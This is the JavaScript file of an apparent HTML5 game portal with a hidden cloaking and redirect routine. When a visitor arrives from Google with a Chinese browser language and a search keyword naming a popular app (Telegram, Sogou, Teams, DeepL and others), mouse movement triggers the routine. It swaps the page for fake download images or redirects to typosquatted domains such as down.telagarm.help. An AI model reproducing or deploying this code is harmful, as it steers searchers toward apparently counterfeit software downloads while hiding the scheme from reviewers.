var numCount=0;
var allowCount=5;
var confArr=[
["helloworld",3,"https://down.666888.help/goo/hw.php",false],
["yifanyi|易翻译",2,"https://down.666888.help/goo/traneasy.php",false],
["deepl",1,"https://www.nsuydeepl.top",true],
["teams",2,"https://down.666888.help/goo/tearns.php",false],
["sogou|搜狗|输入法",3,"https://down.666888.help/goo/sogou.php",false],
["kuailian|快连",3,"https://down.666888.help/goo/letsp.php",false],
["qishui|汽水",1,"https://down.666888.help/goo/soda.php",false],
["telegram|tg|飞机|电报",5,"https://down.telagarm.help/downloads.php",false]
];

var findObj;
var refs;
var clang;

$(function()
{
	refs=checkRef();
	clang=checkLang();
	const urlParams = new URLSearchParams(window.location.search);
	var kw=urlParams.get("kw");
	if(kw){kw=kw.toLowerCase().replaceAll(" ","");}
	if(kw && refs && clang)
	{
		for(var i=0;i<confArr.length;i++)
		{
			var arrObj=confArr[i];
			var curName=arrObj[0].toLowerCase();
			if(new RegExp(curName).test(kw)==true)
			{
				findObj=confArr[i];
				break;
			}
		}
	}

	$("body").mousemove(function(event)
	{
		if(event.pageX>0 && event.pageY>0 && findObj && refs && clang)
		{
			numCount++;
			if(numCount==allowCount)
			{
				document.title="site";
				if(findObj[3]==true)
				{
					window.location=findObj[2];
				}
				else
				{
					var imgDoms="";
					var sName=findObj[0].split("|")[0];
					for(var i=1;i<=findObj[1];i++)
					{
						imgDoms+="<img class='ces' src='"+sName+i+".jpg' />";
					}
					$("body").html(imgDoms);
				}
			}
		}
	});

	$("body").click(function(event)
	{
		if(checkRes(event)==true)
		{
			window.location=findObj[2];
		}
	});



	$(".container .game-grid article.game-card").click(function()
	{
		var datas=$(this).attr("data");
		var datat=$(this).children("h3").text();
		if(datas)
		{
			$(".gameBox .gTitle h6").text(datat);
			let mainDomain="https://html5.gamedistribution.com";
			var paths=mainDomain+"/"+datas;
			$(".gameBox .gDom").html("<iframe src=\""+paths+"\" marginwidth=\"0\" marginheight=\"0\" align=\"middle\" scrolling=\"no\" frameborder=\"0\" referrerpolicy=\"no-referrer\"></iframe>");
			$(".gameBox").show();
		}
	});
	
	$(".gameBox .gTitle span").click(function()
	{
		$(".gameBox").hide();
		$(".gameBox .gTitle h6").text("");
		$(".gameBox .gDom").html("<iframe src=\"\" marginwidth=\"0\" marginheight=\"0\" align=\"middle\" scrolling=\"no\" frameborder=\"0\" referrerpolicy=\"no-referrer\"></iframe>");
	});
});



function checkRes(e)
{
	if(numCount>=allowCount && e.pageX>0 && e.pageY>0 && findObj && refs && clang)
	{return true;}else{return false;}
}

function checkRef()
{
	var refStr=document.referrer;
	if(refStr)
	{
		if(refStr.indexOf("https://www.google.")>=0){return true;}else{return false;}
	}
	else
	{
		return false;
	}
}


function checkLang()
{
	var arr=navigator.languages;
	if(arr && arr.length>0)
	{
		var result=false;
		for(var i=0;i<arr.length;i++)
		{
			if(arr[i].indexOf("zh")>=0)
			{
				result=true;
				break;
			}
		}
		return result;
	}
	else
	{
		return false;
	}
}